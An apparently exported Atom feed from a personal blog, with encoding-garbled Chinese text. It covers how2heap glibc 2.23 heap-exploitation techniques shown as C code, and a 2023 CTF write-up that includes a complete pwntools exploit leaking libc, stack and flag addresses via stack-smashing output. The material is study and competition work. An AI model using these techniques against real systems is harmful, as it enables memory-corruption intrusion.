<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anza | å­¦ä¹ è®°å½•</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-27T15:36:46.298Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anza</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how2heap</title>
    <link href="http://example.com/2023/09/24/how2heap/"/>
    <id>http://example.com/2023/09/24/how2heap/</id>
    <published>2023-09-24T08:54:35.000Z</published>
    <updated>2023-09-27T15:36:46.298Z</updated>
    
    <content type="html"><![CDATA[<p>è·Ÿç€ how2heap å­¦ä¹ ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬å †çš„åˆ©ç”¨æ‰‹æ³•ï¼Œåˆå›åˆ°æœ€åˆçš„èµ·ç‚¹ï¼Œéšç¼˜æ…¢æ…¢æ›´æ–°~</p><span id="more"></span><h1 id="åŸºç¡€å·¥ä½œ"><a href="#åŸºç¡€å·¥ä½œ" class="headerlink" title="åŸºç¡€å·¥ä½œ"></a>åŸºç¡€å·¥ä½œ</h1><p>å‚è€ƒ<a href="https://github.com/shellphish/how2heap">how2heap</a>ã€‚</p><p>gcc åŠ å…¥è°ƒè¯•ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o fastbin_dup_into_stack fastbin_dup_into_stack.c</span><br></pre></td></tr></table></figure><p>gdb æºç è°ƒè¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l #æ˜¾ç¤ºæºç </span><br><span class="line">b 9 #åœ¨ç¬¬9è¡Œä¸‹æ–­ç‚¹</span><br></pre></td></tr></table></figure><p>æ³¨æ„éœ€è¦ä½¿ç”¨å¯¹åº” glibc ç‰ˆæœ¬çš„ gcc è¿›è¡Œç¼–è¯‘ã€‚</p><h1 id="Glibc2-23"><a href="#Glibc2-23" class="headerlink" title="Glibc2.23"></a>Glibc2.23</h1><h2 id="fastbin-dup-å¸¸ç”¨"><a href="#fastbin-dup-å¸¸ç”¨" class="headerlink" title="fastbin_dup(å¸¸ç”¨)"></a>fastbin_dup(å¸¸ç”¨)</h2><p>UAF æ¼æ´ï¼Œéœ€è¦ç»•è¿‡ double free æ£€æµ‹ï¼Œåˆ©ç”¨æ‰‹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>å¯¼è‡´ a å’Œ c æŒ‡å‘åŒä¸€å¤„ã€‚</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>UAF æ¼æ´ï¼Œç”³è¯·å°å †å— p1 å¹¶é‡Šæ”¾åï¼Œè‹¥æ­¤æ—¶å†ç”³è¯·åˆ°ä¸€ä¸ªå¤§å †å— p3ï¼Œåˆ™è§¦å‘<code>malloc_consolidate</code>ï¼Œp1 è¢«å¹¶å…¥ top chunkï¼Œè€Œåå†åˆ†é…å †å—ç»™ p3ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">assert(p1 == p3);</span><br></pre></td></tr></table></figure><p>å¯¼è‡´ p1 å’Œ p3 æŒ‡å‘åŒä¸€å¤„ã€‚</p><p>æ­¤æ—¶ä¾¿å¯ä»¥åˆ©ç”¨ p1 é‡Šæ”¾ p3ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å †å—å°†å’Œ p3 æŒ‡å‘åŒä¸€å¤„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">assert(p4 == p3);</span><br></pre></td></tr></table></figure><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>UAF æ¼æ´ï¼Œæ‰¿æ¥ fastbin_dupã€‚å‡è®¾æˆ‘ä»¬æ³„éœ²å‡ºä¸€ä¸ªæ ˆåœ°å€ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ double free ç”³è¯·åˆ°è¿™ç‰‡æ ˆç©ºé—´ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"><span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));<span class="comment">//ä¿®æ”¹fdä¸ºæ ˆæŒ‡é’ˆ</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));<span class="comment">//æ­¤æ—¶ç”³è¯·åˆ°æ ˆç©ºé—´</span></span><br></pre></td></tr></table></figure><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>ä¹Ÿæ˜¯å»ºç«‹åœ¨ UAF ä¸Šï¼Œå¯ä»¥ç”¨æ¥åœ¨æŸå¤„å†™ä¸€ä¸ªæœ€å¤§å€¼ï¼Œä¾‹å¦‚å†™ global_max_fastã€‚</p><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹ unsorted bin ä¸­ p çš„ BK æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ [ç›®æ ‡åœ°å€-0x16] å¤„ï¼Œå¯ä»¥ä½¿ç›®æ ‡åœ°å€æ”¹ä¸ºä¸€ä¸ªæå¤§çš„å€¼ (å³ main_arena+88) ã€‚</p><h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p>å»ºç«‹åœ¨å †æº¢å‡ºä¸Šï¼Œå¹¶ä¸”èƒ½æ‹¿åˆ°æ ˆåœ°å€ï¼Œå³å¯ä»¥é€šè¿‡ä¸Šä¸€ä¸ªå †å—ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„ size ä½ã€‚</p><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//é˜²æ­¢åˆå¹¶</span></span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;<span class="comment">//åœ¨æ ˆä¸Šä¼ªé€ unsorted binï¼Œä¿®æ”¹å…¶BKæŒ‡å‘ä»»ä½•å¯å†™çš„åœ°æ–¹</span></span><br><span class="line"></span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;<span class="comment">//sizeè¦ä¸åŒä»¥é€šè¿‡checkï¼š 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</span></span><br><span class="line">victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer;<span class="comment">//é€šè¿‡æº¢å‡ºä¹‹ç±»çš„æ‰‹æ³•ä¿®æ”¹ç¬¬ä¸€ä¸ªå †å—çš„sizeä»¥åŠå…¶BK</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//è¿™ä¸€æ¬¡åˆ†é…ä¼šæ‹¿åˆ°æ ˆä¸Šçš„ç©ºé—´</span></span><br><span class="line"><span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot;</span><br><span class="line"><span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><h2 id="unsafe-unlink-å¸¸ç”¨"><a href="#unsafe-unlink-å¸¸ç”¨" class="headerlink" title="unsafe_unlink(å¸¸ç”¨)"></a>unsafe_unlink(å¸¸ç”¨)</h2><p>éœ€è¦ off-by-nullï¼Œå¹¶è¦å­¦ä¼šç©ºé—´å¤ç”¨æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„ prev_sizeã€‚</p><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;<span class="comment">//å…¨å±€å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);<span class="comment">//chunk0_ptrå…¨å±€å˜é‡ä¸ºæˆ‘ä»¬è¦æ”»å‡»çš„åœ°å€</span></span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<span class="comment">//ä¼ªé€ chunk1çš„headerï¼Œä¿®æ”¹å…¶presizeå’Œä½¿ç”¨ä½</span></span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ chunk å†…æ•°æ®å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242116182.png" alt="image-20230924211651997" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242126099.png" alt="image-20230924212600974" style="zoom:50%;" /><p>é‡Šæ”¾å®Œæˆ unlinkï¼Œæ­¤æ—¶å…¨å±€å˜é‡ victim å°±è¢«ä¿®æ”¹æˆäº†æŒ‡å‘è‡ªå·±é‚£å—ç©ºé—´çš„æŒ‡é’ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(chunk1_ptr);</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309242127097.png" alt="image-20230924212729963" style="zoom:50%;" /><p>æ³¨æ„ä¸€èˆ¬ victim æ‰€åœ¨æŒ‡é’ˆå…·æœ‰å†™çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹å®ƒè‡ªå·±ä»¥ä¿®æ”¹å…¶ä»–ä½ç½®ã€‚</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>åŒæ ·ç”¨æ¥å†™å…¥ä¸€ä¸ªå¤§å€¼ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;<span class="comment">//æˆ‘ä»¬çš„ä¿®æ”¹ç›®æ ‡</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);<span class="comment">//p1å’Œp2é“¾å…¥unsortedbin</span></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);<span class="comment">//p2è¿›å…¥largebin,p1ä»åœ¨largebinä¸­ï¼Œè¢«åˆ‡å‰²</span></span><br><span class="line"><span class="built_in">free</span>(p3);<span class="comment">//p3é“¾å…¥unsortedbin</span></span><br><span class="line"></span><br><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;<span class="comment">//æ”¹å°sizeä½</span></span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);<span class="comment">//ä¿®æ”¹bkå’Œbk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);<span class="comment">//å†ç”³è¯·ä¸€ä¸ªï¼Œ</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è·Ÿç€ how2heap å­¦ä¹ ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬å †çš„åˆ©ç”¨æ‰‹æ³•ï¼Œåˆå›åˆ°æœ€åˆçš„èµ·ç‚¹ï¼Œéšç¼˜æ…¢æ…¢æ›´æ–°~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>wp</title>
    <link href="http://example.com/2023/09/04/wp/"/>
    <id>http://example.com/2023/09/04/wp/</id>
    <published>2023-09-04T12:14:08.000Z</published>
    <updated>2023-09-28T11:02:51.424Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç›˜ã€è®°å½•è¿‘æœŸä¸€äº›æ¯”èµ›çš„ wpã€‚</p><span id="more"></span><h1 id="2023åä¸ºæ¯"><a href="#2023åä¸ºæ¯" class="headerlink" title="2023åä¸ºæ¯"></a>2023åä¸ºæ¯</h1><p>è¢«æ‰“çˆ†äº†ï¼Œå¼€å±€è¿ä¸ä¸Šç½‘ï¼ŒåŸæ¥æ˜¯å’Œ vpn å†²çªäº†ï¼Œç„¶åç™»ä¸ä¸Šè´¦å·ï¼Œç»“æœå¯†ç ä¸­çš„<code>I</code>æ˜¯<code>L</code>ã€‚</p><p>ç­¾åˆ° pwn æƒ³äº†ä¼šæœ‰æ€è·¯äº†ï¼Œæ‰“äº†åŠä¸ªå¤šå°æ—¶å‡ºäº†ã€‚ç„¶åçœ‹äº†å¦ä¸€é“åˆ©ç”¨ gadget ç¼–å†™è¿”å›åœ°å€çš„ asm pwnï¼Œä¸çŸ¥é“æ€ä¹ˆæ„é€  rdi ä½¿å…¶æŒ‡å‘ /bin/shï¼Œé‚ç½¢ã€‚è¿˜æœ‰ä¸€é“ web cgiï¼Œå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¼–ç é—®é¢˜ï¼Œä¸€ç›´è¯»ä¸è¿›å»0xe0 ä¸å¯è§å­—ç¬¦ï¼Œæ˜æ˜æ„Ÿè§‰ç¦»ç­”æ¡ˆå¾ˆè¿‘äº†ï¼Œå¯„ã€‚c++ çš„ 300 åˆ†å¤§é¢˜å°±æ²¡çœ‹ğŸ˜­ã€‚</p><h2 id="1-easy-ssp"><a href="#1-easy-ssp" class="headerlink" title="1. easy_ssp"></a>1. easy_ssp</h2><p>æŸ¥äº†ä¸‹ sspï¼Œå‘ç°å°±æ˜¯ stack_smashing æ³„éœ²ï¼Œå†çœ‹äº†ä¸€çœ¼ libcï¼Œæ˜¯2.23 ï¼ˆè¿™ä¸ªç¯å¢ƒæœªä¿®å¤ sspï¼‰ã€‚</p><p>ç¨‹åºå¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272039186.png" alt="image-20230927203942942" style="zoom:50%;" /><p>ä¸‰æ¬¡æ ˆæº¢å‡ºï¼šç¬¬ä¸€æ¬¡è¦†ç›–ç”¨æˆ·å˜é‡ä¸º got è¡¨ï¼Œæ³„éœ²å‡º libcï¼Œç¬¬äºŒæ¬¡è¦†ç›–ç”¨æˆ·å˜é‡ä¸º environï¼Œæ³„éœ²å‡º stackï¼Œç¬¬ä¸‰æ¬¡è¦†ç›–ç”¨æˆ·å˜é‡ä¸º stack ä¸Šçš„ flagï¼Œæ³„éœ²å‡ºåŠ å¯†åçš„ flagï¼Œè§£å¯†å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.10.0.4&quot;</span>, <span class="number">10085</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b (gets)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(puts_got)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;environ==&gt;&quot;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(environ)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack==&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your random id is: &quot;</span>)</span><br><span class="line">key = <span class="built_in">int</span>(io.recv(<span class="number">2</span>), <span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;key==&gt;&quot;</span>+<span class="built_in">str</span>(key))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to do?&quot;</span>, p64(stack-<span class="number">376</span>)*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">enc = io.recvuntil(<span class="string">&quot;terminated&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag = flag + <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])^key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-master-of-asm"><a href="#2-master-of-asm" class="headerlink" title="2. master-of-asm"></a>2. master-of-asm</h2><p>é¢˜ç›®çœ‹èµ·æ¥è›®ç®€å•çš„ï¼Œå°±æ˜¯ä¸ä¼šåšã€‚å…³é”®æ˜¯ä¸çŸ¥é“å¦‚ä½•æ„é€  rdi æŒ‡å‘ /bin/shï¼Œä¹Ÿæ²¡è·Ÿ rdi ç›¸å…³çš„ gadgetå•Šï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272110220.png" alt="image-20230927211056177" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272111614.png" alt="image-20230927211126505" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272111539.png" alt="image-20230927211146444" style="zoom:50%;" /><p>çŒœæƒ³ä¼šä¸ä¼šæ˜¯æ‰§è¡Œå…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼Œç­‰ wpã€‚</p><h2 id="3-APACHE-CGI-PWN"><a href="#3-APACHE-CGI-PWN" class="headerlink" title="3. APACHE-CGI-PWN"></a>3. APACHE-CGI-PWN</h2><h3 id="å¤ç°ç¯å¢ƒæ­å»º"><a href="#å¤ç°ç¯å¢ƒæ­å»º" class="headerlink" title="å¤ç°ç¯å¢ƒæ­å»º"></a>å¤ç°ç¯å¢ƒæ­å»º</h3><p>æ­å»ºç¯å¢ƒæ˜¯ windows ä¸‹çš„ 